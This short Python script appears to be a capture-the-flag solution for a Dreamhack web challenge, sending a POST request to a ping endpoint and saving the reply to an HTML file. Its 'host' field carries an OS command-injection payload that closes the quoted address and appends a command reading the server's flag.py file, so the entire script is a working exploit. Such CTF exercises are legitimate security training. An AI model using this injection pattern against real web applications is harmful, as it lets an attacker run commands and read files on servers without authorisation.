import requests

url = "http://host8.dreamhack.games:16221/ping"
data = {"host": '127.0.0.1"; cat ./flag.py #'}

response = requests.post(url, data=data)

with open("decode_res.html", "w", encoding="utf-8") as f:
    f.write(response.text)